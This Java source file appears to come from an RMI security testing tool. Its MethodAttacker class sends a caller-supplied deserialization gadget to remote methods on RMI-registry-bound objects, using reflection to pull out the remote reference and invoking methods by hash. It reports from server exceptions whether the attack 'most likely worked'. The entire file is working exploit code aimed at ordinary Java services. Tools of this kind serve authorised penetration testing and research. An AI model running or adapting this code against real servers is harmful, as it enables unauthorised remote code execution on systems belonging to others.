package de.qtc.rmg;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;

import de.qtc.rmg.internal.MethodCandidate;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import javassist.CannotCompileException;
import javassist.NotFoundException;

public class MethodAttacker {

    private RMIWhisperer rmi;
    private HashMap<String,String> classes;
    private MethodCandidate targetMethod;

    private Field proxyField;
    private Field remoteField;
    private Field parameterTypes;

    public MethodAttacker(RMIWhisperer rmiRegistry, HashMap<String,String> classes, MethodCandidate targetMethod)
    {
        this.rmi = rmiRegistry;
        this.classes = classes;
        this.targetMethod = targetMethod;

        try {
            this.proxyField = Proxy.class.getDeclaredField("h");
            this.remoteField = RemoteObject.class.getDeclaredField("ref");
            this.parameterTypes = Method.class.getDeclaredField("parameterTypes");
            proxyField.setAccessible(true);
            remoteField.setAccessible(true);
            parameterTypes.setAccessible(true);

        } catch(NoSuchFieldException | SecurityException e) {
            Logger.eprintlnMixedYellow("Unexpected Exception caught during MethodAttacker instantiation:", e.getMessage());
            Logger.eprintln("Cannot continue from here");
            System.exit(1);
        }
    }

    public void attack(Object gadget)
    {
        attack(gadget, null, 0);
    }

    public void attack(Object gadget, String boundName)
    {
        attack(gadget, boundName, 0);
    }

    @SuppressWarnings({ "rawtypes", "deprecation" })
    public void attack(Object gadget, String boundName, int argumentPosition)
    {
        Logger.printlnMixedYellow("Attacking", this.targetMethod.getSignature());

        Iterator<Entry<String, String>> it = this.classes.entrySet().iterator();
        while (it.hasNext()) {

            Map.Entry pair = (Map.Entry)it.next();
            String name = (String)pair.getKey();
            String className = (String)pair.getValue();

            if( boundName != null && !boundName.equals(name) ) {
                continue;
            }

            Logger.printlnMixedYellow("Current bound name:", name);
            Logger.increaseIndent();

            int attackArgument = 0;
            try {
                attackArgument = this.targetMethod.getPrimitive(argumentPosition);
            } catch (NotFoundException e1) {
                Logger.eprintlnMixedYellow("Caught unexpected", "NotFoundException", "while searching for primitives.");
                Logger.eprintln("Cannot continue from here.");
                System.exit(1);
            }

            if( attackArgument == 0 ) {
                Logger.eprintlnMixedYellow("No non primitive arguments were found for method signature", this.targetMethod.getSignature(), ".");
                Logger.eprintln("Cannot continue from here");
                System.exit(1);
            }

            Logger.printlnMixedYellow("Found non primitive argument on position", String.valueOf(attackArgument), ".");

            Remote instance = null;
            Class remoteClass = null;
            RemoteRef remoteRef = null;

            try {
                remoteClass = RMGUtils.makeInterface(className, this.targetMethod.getSignature());
            } catch(CannotCompileException e) {
                Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during interface creation.");
                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
                Logger.decreaseIndent();
                continue;
            }

            try {
                instance = rmi.getRegistry().lookup(name);

                RemoteObjectInvocationHandler ref = (RemoteObjectInvocationHandler)proxyField.get(instance);
                remoteRef = ref.getRef();

            } catch( Exception e ) {
                Logger.eprintlnMixedYellow("Error: Unable to get instance for", name, ".");
                Logger.eprintlnMixedYellow("The following exception was caught:", e.getMessage());
                Logger.decreaseIndent();
                continue;
            }

            Method[] allMethods = remoteClass.getDeclaredMethods();
            Method attackMethod = allMethods[0];
            Object[] methodArguments = RMGUtils.getArgumentArray(attackMethod);

            Object[] payloadArray = new Object[2];
            Object randomInstance = null;

            try {
                Class randomClass = RMGUtils.makeRandomClass();
                randomInstance = randomClass.newInstance();

            } catch (CannotCompileException e) {
                Logger.eprintlnMixedYellow("Caught", "CannotCompileException", "during random class creation.");
                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
                Logger.decreaseIndent();
                continue;

            } catch (InstantiationException | IllegalAccessException e) {
                Logger.eprintlnMixedYellow("Caught", "InstantiationException", "during random class creation.");
                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
                Logger.decreaseIndent();
                continue;

            } catch (NotFoundException e) {
                Logger.eprintlnMixedYellow("Caught", "NotFoundException", "during random class creation.");
                Logger.eprintlnMixedYellow("Exception message:", e.getMessage());
                Logger.decreaseIndent();
                continue;
            }

            payloadArray[0] = gadget;
            payloadArray[1] = randomInstance;
            methodArguments[attackArgument] = payloadArray;

            try {
                remoteRef.invoke(instance, attackMethod, methodArguments, this.targetMethod.getHash());

            } catch (java.rmi.ServerException e) {

                Throwable cause = RMGUtils.getCause(e);
                if( cause instanceof java.rmi.UnmarshalException ) {
                    Logger.eprintlnMixedYellow("Method", this.targetMethod.getSignature(), "does not exist on this bound name.");
                    continue;

                } else if( cause instanceof java.lang.ClassNotFoundException ) {
                    Logger.printlnMixedBlue("Caught", "ClassNotFoundException", "during deserialization attack.");

                    String exceptionMessage = e.getMessage();
                    if( exceptionMessage.contains(randomInstance.getClass().getName())) {
                        Logger.printlnYellow("Deserialization attack most likely worked :)");

                    } else {
                        Logger.eprintlnYellow("Deserialization attack probably failed.");
                        Logger.eprintln("StackTrace:");
                        e.printStackTrace();
                    }
                }
            } catch ( Exception e ) {
                Logger.eprintlnYellow("Caught unexpected Exception during deserialization attack.");
                Logger.eprintln("StackTrace:");
                e.printStackTrace();
                continue;

            } finally {
                Logger.decreaseIndent();
                Logger.println("");
            }
        }
    }
}
